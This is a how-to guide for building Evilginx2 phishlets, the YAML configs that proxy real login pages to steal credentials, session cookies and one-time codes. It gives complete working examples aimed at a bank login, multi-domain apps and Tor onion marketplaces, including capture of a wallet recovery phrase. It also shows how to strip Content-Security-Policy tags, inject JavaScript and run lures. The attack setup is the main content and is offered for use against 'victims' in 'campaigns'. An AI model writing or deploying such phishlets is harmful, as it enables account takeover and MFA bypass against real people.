# Evilginx2 Phishlet Customization Guide

Complete guide for creating and customizing phishlets for Evilginx2, including support for v3 onion addresses.

## Table of Contents
- [Introduction to Phishlets](#introduction-to-phishlets)
- [Phishlet Structure](#phishlet-structure)
- [Creating Your First Phishlet](#creating-your-first-phishlet)
- [Advanced Configuration](#advanced-configuration)
- [Working with v3 Onion Addresses](#working-with-v3-onion-addresses)
- [Testing Your Phishlet](#testing-your-phishlet)
- [Best Practices](#best-practices)
- [Troubleshooting](#troubleshooting)
- [Examples](#examples)

## Introduction to Phishlets

### What is a Phishlet?

A phishlet is a YAML configuration file that defines how Evilginx2 should proxy a target website. It specifies:
- Which domains to proxy
- How to capture credentials
- Which cookies/tokens to intercept
- How to filter and modify requests/responses
- Where to redirect victims after credential capture

### Why Create Custom Phishlets?

- Target websites not covered by existing phishlets
- Customize behavior for specific campaigns
- Update outdated phishlets when websites change
- Support internal/private web applications
- Work with onion services (.onion addresses)

### Prerequisites

Before creating phishlets, you should understand:
- HTML and HTTP basics
- Browser developer tools (Network tab)
- Regular expressions (regex)
- YAML syntax
- How the target website's authentication works

## Phishlet Structure

### Basic Anatomy

Every phishlet is a YAML file with these main sections:

```yaml
# Minimum Evilginx version required
min_ver: '3.0.0'

# Proxy host configurations
proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'accounts', domain: 'example.com', ...}

# Content filtering rules
sub_filters:
  - {triggers_on: 'example.com', orig_sub: 'accounts', ...}

# Authentication tokens to capture
auth_tokens:
  - domain: '.example.com'
    keys: ['session_token']

# Credential capture configuration
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

# Login page configuration
login:
  domain: 'accounts.example.com'
  path: '/login'
```

### Section Details

#### 1. min_ver (Required)

Specifies the minimum Evilginx version required:

```yaml
min_ver: '3.0.0'
```

#### 2. proxy_hosts (Required)

Defines which domains to proxy and how:

```yaml
proxy_hosts:
  - phish_sub: 'login'           # Subdomain on your phishing domain
    orig_sub: 'accounts'         # Original subdomain on target
    domain: 'example.com'        # Target domain
    session: true                # Track sessions for this host
    is_landing: true             # This is the landing page
    auto_filter: true            # Automatically filter phishing URLs
```

**Parameters:**
- `phish_sub`: Subdomain to use on your phishing domain
- `orig_sub`: Original subdomain of the target website
- `domain`: Base domain of the target
- `session`: Enable session tracking (required for credential capture)
- `is_landing`: Mark as landing page (where phishing starts)
- `auto_filter`: Automatically replace phishing URLs with originals

#### 3. sub_filters (Optional)

Define custom content filtering rules:

```yaml
sub_filters:
  - triggers_on: 'example.com'    # Domain that triggers this filter
    orig_sub: 'accounts'           # Subdomain to filter
    domain: 'example.com'          # Target domain
    search: 'original-text'        # Text to search for
    replace: 'replacement-text'    # Text to replace with
    mimes: ['text/html', 'application/javascript']  # MIME types to filter
    redirect_only: false           # Only apply during redirects
```

**Common use cases:**
- Fix hardcoded domains in JavaScript
- Remove security headers
- Modify API endpoints
- Replace internal URLs

#### 4. auth_tokens (Required for 2FA bypass)

Specify which cookies/tokens to capture:

```yaml
auth_tokens:
  - domain: '.example.com'        # Cookie domain (use . prefix for subdomains)
    keys: ['session_id', 'auth_token']  # Cookie names to capture
    
  # Optional parameters:
  - domain: '.example.com'
    keys: ['optional_cookie']
    optional: true                # Don't fail if cookie is missing
    
  - domain: '.example.com'
    keys: ['always_capture']
    always: true                  # Capture even if not in auth tokens list
```

#### 5. auth_urls (Optional)

Define URLs that indicate successful authentication:

```yaml
auth_urls:
  - '/dashboard'
  - '/home'
  - 'https://example.com/welcome'
```

#### 6. credentials (Required)

Define how to capture credentials:

```yaml
credentials:
  username:
    key: 'email'                  # Form field name
    search: '(.*)'                # Regex to extract value
    type: 'post'                  # Request type (post, json)
    
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
    
  # Custom fields
  custom:
    - key: 'otp'                  # 2FA code
      search: '(.*)'
      type: 'post'
```

**Types:**
- `post`: URL-encoded form data (application/x-www-form-urlencoded)
- `json`: JSON request body (application/json)

#### 7. login (Required)

Specify the login page:

```yaml
login:
  domain: 'accounts.example.com'  # Login domain
  path: '/login'                  # Login path (regex supported)
```

With regex:
```yaml
login:
  domain: 'accounts.example.com'
  path: '/auth/.*'                # Match multiple paths
```

## Creating Your First Phishlet

### Step 1: Analyze the Target Website

1. **Visit the target website** and open browser Developer Tools (F12)
2. **Go to the Network tab** and clear it
3. **Perform a login** with test credentials
4. **Examine the requests:**
   - Find the login POST request
   - Note the domain and path
   - Check the request payload for credential field names
   - Look at response cookies

**Example analysis for a fictional site:**
- Login URL: `https://accounts.example.com/auth/login`
- POST fields: `email`, `pass`
- Session cookie: `session_id` (domain: `.example.com`)
- Redirect after login: `https://example.com/dashboard`

### Step 2: Create the Phishlet File

Create a new file: `phishlets/example.yaml`

```yaml
min_ver: '3.0.0'

# Define all hosts/subdomains needed
proxy_hosts:
  # Main login page
  - phish_sub: 'accounts'
    orig_sub: 'accounts'
    domain: 'example.com'
    session: true
    is_landing: true
    auto_filter: true
    
  # Main site (after login)
  - phish_sub: 'www'
    orig_sub: 'www'
    domain: 'example.com'
    session: false
    is_landing: false
    auto_filter: true

# Capture session cookie
auth_tokens:
  - domain: '.example.com'
    keys: ['session_id']

# Capture credentials
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'pass'
    search: '(.*)'
    type: 'post'

# Define login page
login:
  domain: 'accounts.example.com'
  path: '/auth/login'
```

### Step 3: Test the Phishlet

```bash
# Start Evilginx
./evilginx -p ./phishlets

# Configure domain
config domain phishing.com
config ip YOUR_IP

# Set up phishlet
phishlets hostname example accounts.phishing.com

# Enable it
phishlets enable example

# Create a lure
lures create example
lures get-url 0

# Test by visiting the lure URL
```

### Step 4: Refine and Debug

1. **Enable debug mode:** `./evilginx -p ./phishlets -debug`
2. **Check for errors** in the terminal output
3. **Test the login flow** completely
4. **Verify credential capture:** `sessions`
5. **Adjust filters** if URLs aren't being rewritten correctly

## Advanced Configuration

### JavaScript Injection

Inject custom JavaScript into proxied pages:

```yaml
js_inject:
  - trigger_domains: ['example.com']
    trigger_paths: ['/login.*']
    script: |
      // Your JavaScript code here
      console.log('Injected script running');
      
      // Example: Capture additional data
      document.getElementById('loginForm').addEventListener('submit', function(e) {
        // Your code
      });
```

### Force POST Parameters

Force specific values in POST requests:

```yaml
force_post:
  - path: '/auth/login'           # Path regex
    search:                       # Conditions to match
      - key: 'email'
        search: '.*@.*'           # Must be an email
    force:                        # Values to inject
      - key: 'remember_me'
        value: 'true'
    type: 'post'                  # or 'json'
```

### Custom Filters

Replace hardcoded domains or content:

```yaml
sub_filters:
  # Fix hardcoded API domain in JavaScript
  - triggers_on: 'example.com'
    orig_sub: 'api'
    domain: 'example.com'
    search: 'api\.example\.com'
    replace: 'api.{domain}'       # {domain} replaced with phishing domain
    mimes: ['text/html', 'application/javascript']
    
  # Remove CSP header via content
  - triggers_on: 'example.com'
    orig_sub: 'accounts'
    domain: 'example.com'
    search: '<meta http-equiv="Content-Security-Policy"[^>]*>'
    replace: ''
    mimes: ['text/html']
```

### Multiple Authentication Tokens

Capture multiple cookies/tokens:

```yaml
auth_tokens:
  # Primary session token
  - domain: '.example.com'
    keys: ['session_id', 'csrf_token']
    
  # OAuth token
  - domain: '.auth.example.com'
    keys: ['oauth_token']
    
  # Refresh token
  - domain: '.api.example.com'
    keys: ['refresh_token']
    optional: true                # Don't fail if missing
```

### JSON Credentials

For JSON-based login APIs:

```yaml
credentials:
  username:
    key: 'email'
    search: '"email":"([^"]*)"'   # Capture from JSON
    type: 'json'
    
  password:
    key: 'password'
    search: '"password":"([^"]*)"'
    type: 'json'
    
  custom:
    - key: 'device_id'
      search: '"device_id":"([^"]*)"'
      type: 'json'
```

### Landing Page Detection

Specify multiple landing pages:

```yaml
proxy_hosts:
  - phish_sub: 'login'
    orig_sub: 'login'
    domain: 'example.com'
    session: true
    is_landing: true              # Primary landing
    auto_filter: true
    
  - phish_sub: 'signup'
    orig_sub: 'signup'
    domain: 'example.com'
    session: true
    is_landing: true              # Alternative landing
    auto_filter: true
```

## Working with v3 Onion Addresses

### Onion Service Phishlets

To create a phishlet for a .onion service:

#### Method 1: Direct Onion Proxy

```yaml
min_ver: '3.0.0'

# Proxy the onion service directly
proxy_hosts:
  - phish_sub: 'darkweb'
    orig_sub: ''                                    # No subdomain
    domain: 'exampleoniondomain3456.onion'         # Full v3 onion address
    session: true
    is_landing: true
    auto_filter: true

auth_tokens:
  - domain: '.exampleoniondomain3456.onion'
    keys: ['session']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'exampleoniondomain3456.onion'
  path: '/login'
```

**Important:** Configure Evilginx to use Tor SOCKS proxy:

```bash
# In Evilginx terminal:
proxy socks5h 127.0.0.1 9050
proxy on
```

#### Method 2: Mixed Clearnet and Onion

For sites with both clearnet and onion addresses:

```yaml
min_ver: '3.0.0'

proxy_hosts:
  # Clearnet landing page
  - phish_sub: 'www'
    orig_sub: 'www'
    domain: 'example.com'
    session: true
    is_landing: true
    auto_filter: true
    
  # Onion service for actual login
  - phish_sub: 'secure'
    orig_sub: ''
    domain: 'exampleonion3456.onion'
    session: true
    is_landing: false
    auto_filter: true

# Filters to redirect to onion
sub_filters:
  - triggers_on: 'example.com'
    orig_sub: 'www'
    domain: 'example.com'
    search: 'href="/login"'
    replace: 'href="https://secure.{domain}/login"'
    mimes: ['text/html']

auth_tokens:
  - domain: '.exampleonion3456.onion'
    keys: ['auth_token']

credentials:
  username:
    key: 'user'
    search: '(.*)'
    type: 'post'
  password:
    key: 'pass'
    search: '(.*)'
    type: 'post'

login:
  domain: 'exampleonion3456.onion'
  path: '/login'
```

### Onion-Specific Considerations

1. **Always use `socks5h`** (not `socks5`) to resolve .onion hostnames through Tor:
   ```bash
   proxy socks5h 127.0.0.1 9050
   ```

2. **Performance**: Onion routing adds latency; expect slower page loads

3. **Cookie domains**: Onion addresses can be used in cookie domains:
   ```yaml
   auth_tokens:
     - domain: '.longonionaddress3456789abcdefgh.onion'
       keys: ['session']
   ```

4. **Testing**: Always test with actual Tor Browser first to understand the site's behavior

5. **SSL/TLS**: Onion services may use self-signed certificates; use developer mode:
   ```bash
   ./evilginx -p ./phishlets -developer
   ```

### Example: Complete Onion Phishlet

```yaml
# Example phishlet for a fictional onion service marketplace
min_ver: '3.0.0'

proxy_hosts:
  # Main marketplace
  - phish_sub: 'market'
    orig_sub: ''
    domain: 'marketexample34567abcdefghijk.onion'
    session: true
    is_landing: true
    auto_filter: true

# Fix relative URLs to use our phishing domain
sub_filters:
  - triggers_on: 'marketexample34567abcdefghijk.onion'
    orig_sub: ''
    domain: 'marketexample34567abcdefghijk.onion'
    search: '/static/'
    replace: 'https://market.{domain}/static/'
    mimes: ['text/html']

# Capture session cookie and captcha bypass token
auth_tokens:
  - domain: '.marketexample34567abcdefghijk.onion'
    keys: ['session_id', 'captcha_token']

# Capture login credentials
credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'pin'                  # 2FA PIN
      search: '(.*)'
      type: 'post'

# Login page
login:
  domain: 'marketexample34567abcdefghijk.onion'
  path: '/auth/login'
```

## Testing Your Phishlet

### Test Checklist

- [ ] Phishlet loads without errors
- [ ] All required domains are accessible
- [ ] Login page displays correctly
- [ ] Forms submit properly
- [ ] Credentials are captured
- [ ] Authentication tokens are captured
- [ ] Post-login pages work
- [ ] Logout works properly
- [ ] No JavaScript errors in browser console

### Testing Procedure

1. **Start in Debug Mode:**
   ```bash
   ./evilginx -p ./phishlets -debug
   ```

2. **Configure and Enable:**
   ```bash
   config domain test.local
   config ip 127.0.0.1
   phishlets hostname mysite login.test.local
   phishlets enable mysite
   ```

3. **Create Test Lure:**
   ```bash
   lures create mysite
   lures get-url 0
   ```

4. **Test in Browser:**
   - Visit the lure URL
   - Complete the login flow
   - Check browser DevTools for errors

5. **Verify Capture:**
   ```bash
   sessions
   sessions 0
   ```

### Common Issues

**Issue: Page doesn't load**
- Check if all domains in `proxy_hosts` are correct
- Verify DNS resolution
- Check if target website is accessible
- For onions: Verify Tor proxy is working

**Issue: Credentials not captured**
- Verify field names match the actual form fields
- Check if login is POST or JSON
- Ensure `type` is correct in credentials section
- Enable debug mode to see POST data

**Issue: Cookies not captured**
- Check cookie domain matches (use browser DevTools)
- Ensure cookie names are correct
- Check if cookies are HttpOnly (should still work)
- Verify the cookie domain pattern (use `.domain.com` for subdomains)

**Issue: JavaScript errors**
- Check for hardcoded domains in JS files
- Add appropriate `sub_filters` to replace them
- Check Content Security Policy (CSP) headers
- May need to inject custom JS to fix issues

**Issue: Redirect loops**
- Check `auth_urls` configuration
- Verify `is_landing` is set correctly
- Check for redirect URLs in filters

## Best Practices

### Security

1. **Test in isolated environment** first
2. **Never commit sensitive data** (credentials, tokens)
3. **Use version control** for phishlet development
4. **Document your phishlets** with comments
5. **Keep phishlets updated** as target sites change

### Performance

1. **Minimize proxy_hosts** - Only include necessary domains
2. **Optimize regex patterns** - Use specific patterns, not `.*`
3. **Limit sub_filters** - Only filter when necessary
4. **Test thoroughly** before production use

### Maintainability

1. **Use clear naming** for phish_sub subdomains
2. **Comment complex regex** patterns
3. **Group related filters** together
4. **Keep phishlets modular** - One target per phishlet

### Development Workflow

1. **Analyze target** thoroughly before coding
2. **Start simple** - Basic proxying first
3. **Add features incrementally** - Credentials, then tokens, then filters
4. **Test each change** immediately
5. **Document issues** you encounter
6. **Version your phishlets** (add version comments)

### Regex Tips

Use specific patterns instead of `.*`:

```yaml
# Bad - too broad
search: '(.*)'

# Better - specific format
search: '([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'  # Email

# Good for passwords
search: '([^\s]+)'  # Any non-whitespace

# JSON extraction
search: '"email":"([^"]*)"'  # Email from JSON
```

## Examples

### Example 1: Simple Single-Page Login

```yaml
# Simple website with login on one page
min_ver: '3.0.0'

proxy_hosts:
  - phish_sub: 'login'
    orig_sub: 'login'
    domain: 'simplesite.com'
    session: true
    is_landing: true
    auto_filter: true

auth_tokens:
  - domain: '.simplesite.com'
    keys: ['session']

credentials:
  username:
    key: 'user'
    search: '(.*)'
    type: 'post'
  password:
    key: 'pass'
    search: '(.*)'
    type: 'post'

login:
  domain: 'login.simplesite.com'
  path: '/signin'
```

### Example 2: Multi-Domain Application

```yaml
# Complex app with multiple subdomains
min_ver: '3.0.0'

proxy_hosts:
  # Landing/login
  - phish_sub: 'accounts'
    orig_sub: 'accounts'
    domain: 'bigapp.com'
    session: true
    is_landing: true
    auto_filter: true
    
  # API server
  - phish_sub: 'api'
    orig_sub: 'api'
    domain: 'bigapp.com'
    session: false
    is_landing: false
    auto_filter: true
    
  # Main application
  - phish_sub: 'app'
    orig_sub: 'app'
    domain: 'bigapp.com'
    session: false
    is_landing: false
    auto_filter: true

auth_tokens:
  - domain: '.bigapp.com'
    keys: ['session_id', 'csrf_token']
  - domain: '.api.bigapp.com'
    keys: ['api_key']

credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'json'
  password:
    key: 'password'
    search: '(.*)'
    type: 'json'

login:
  domain: 'accounts.bigapp.com'
  path: '/api/v1/auth'
```

### Example 3: Onion Service with Tor

```yaml
# Dark web marketplace phishlet
min_ver: '3.0.0'

proxy_hosts:
  - phish_sub: 'market'
    orig_sub: ''
    domain: 'darkmarket3456789abcdefghij.onion'
    session: true
    is_landing: true
    auto_filter: true

sub_filters:
  # Fix captcha domain
  - triggers_on: 'darkmarket3456789abcdefghij.onion'
    orig_sub: ''
    domain: 'darkmarket3456789abcdefghij.onion'
    search: 'captcha\.onion'
    replace: 'captcha.{domain}'
    mimes: ['text/html', 'application/javascript']

auth_tokens:
  - domain: '.darkmarket3456789abcdefghij.onion'
    keys: ['market_session', '2fa_token']

credentials:
  username:
    key: 'login'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'mnemonic'           # Recovery phrase
      search: '(.*)'
      type: 'post'

login:
  domain: 'darkmarket3456789abcdefghij.onion'
  path: '/member/login'
```

### Example 4: 2FA/MFA Site

```yaml
# Site with two-factor authentication
min_ver: '3.0.0'

proxy_hosts:
  - phish_sub: 'secure'
    orig_sub: 'secure'
    domain: 'bank.com'
    session: true
    is_landing: true
    auto_filter: true

auth_tokens:
  - domain: '.bank.com'
    keys: ['session_token', 'device_id']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  custom:
    - key: 'otp_code'           # 2FA code
      search: '([0-9]{6})'      # 6-digit code
      type: 'post'
    - key: 'device_name'        # Device trust
      search: '(.*)'
      type: 'post'

login:
  domain: 'secure.bank.com'
  path: '/auth/.*'              # Multiple auth paths
```

## Reference

### Available Variables in Filters

- `{domain}` - Your phishing domain
- `{hostname}` - Current hostname being proxied
- `{subdomain}` - Current subdomain

### MIME Types Reference

Common MIME types for filtering:

- `text/html` - HTML pages
- `text/css` - CSS stylesheets
- `application/javascript` - JavaScript files
- `text/javascript` - Alternative JS MIME
- `application/json` - JSON responses
- `application/x-www-form-urlencoded` - Form data
- `text/plain` - Plain text

### Regex Patterns Reference

Common patterns:

```yaml
# Email
search: '([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'

# URL
search: '(https?://[^\s]+)'

# Any text
search: '(.*)'

# Non-whitespace
search: '([^\s]+)'

# Numbers only
search: '([0-9]+)'

# Alphanumeric
search: '([a-zA-Z0-9]+)'

# JSON value extraction
search: '"key":"([^"]*)"'

# 6-digit code (OTP)
search: '([0-9]{6})'
```

## Troubleshooting

### Debug Mode

Always develop with debug mode:

```bash
./evilginx -p ./phishlets -debug
```

### Check Phishlet Syntax

```bash
# Try loading the phishlet
phishlets

# If it doesn't appear, check for YAML syntax errors
```

### Network Analysis

Use browser DevTools:

1. Open DevTools (F12)
2. Go to Network tab
3. Perform login
4. Check all requests:
   - Method (GET/POST)
   - Headers
   - Request payload
   - Response cookies
5. Look for failed requests

### Onion Debugging

For onion service phishlets:

```bash
# Verify Tor is running
systemctl status tor

# Test Tor connection
curl --socks5-hostname 127.0.0.1:9050 http://check.torproject.org/

# Check Tor logs
sudo journalctl -u tor -f

# Test onion address directly
curl --socks5-hostname 127.0.0.1:9050 http://youronionaddress.onion/
```

### Common YAML Mistakes

```yaml
# Wrong - missing quotes for special characters
search: /path/to/file

# Right
search: '/path/to/file'

# Wrong - incorrect indentation
credentials:
username:
  key: 'email'

# Right
credentials:
  username:
    key: 'email'

# Wrong - list syntax
keys: [cookie1 cookie2]

# Right
keys: ['cookie1', 'cookie2']
```

## Additional Resources

### Learning Resources

1. **HTTP Basics**: MDN Web Docs - HTTP
2. **Regex Tutorial**: regex101.com
3. **YAML Syntax**: yaml.org
4. **Browser DevTools**: Chrome DevTools Documentation

### Tools

- **Browser DevTools** - Essential for analysis
- **Burp Suite** - Intercept and analyze traffic
- **Wireshark** - Deep packet analysis
- **regex101.com** - Test regex patterns
- **yamllint** - Validate YAML syntax

### Example Phishlets

Check the `phishlets/` directory for:
- `example.yaml` - Template with all features
- Real-world examples (if available)

---

**Last Updated**: 2025-11-10  
**Version**: 3.3.0

For more information:
- Installation Guide: `INSTALL.md`
- Commands Reference: `COMMANDS.md`
- Main Documentation: `README.md`
